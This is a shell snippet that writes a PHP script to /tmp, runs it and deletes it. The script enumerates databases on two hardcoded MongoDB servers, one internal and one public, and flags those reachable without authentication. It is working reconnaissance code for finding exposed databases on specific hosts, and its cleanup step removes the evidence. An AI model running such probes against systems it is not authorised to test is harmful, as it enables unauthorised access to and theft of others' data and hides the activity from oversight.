cat > /tmp/mongo.php << 'PHPEOF'
<?php
error_reporting(0);
$targets = array(
    array("MONGO_INT", "172.26.84.132", 27021),
    array("MONGO_EXT", "3.231.83.29", 27017),
);
foreach ($targets as $t) {
    list($label,$h,$p) = $t;
    echo "########## $label ($h:$p) ##########\n";
    try {
        $m = new MongoDB\Driver\Manager("mongodb://$h:$p/?connectTimeoutMS=6000&socketTimeoutMS=6000");
        $cmd = new MongoDB\Driver\Command(array("listDatabases" => 1));
        $cursor = $m->executeCommand("admin", $cmd);
        foreach ($cursor as $doc) {
            foreach ($doc->databases as $db) {
                echo "  DB: ".$db->name." (".$db->sizeOnDisk." bytes)\n";
            }
        }
        echo "  ^^ NO AUTH REQUIRED ^^\n";
    } catch (Exception $e) {
        echo "  ERR: ".substr($e->getMessage(), 0, 200)."\n";
    }
}
echo "MONGO_DONE\n";
?>
PHPEOF
php /tmp/mongo.php
rm -f /tmp/mongo.php
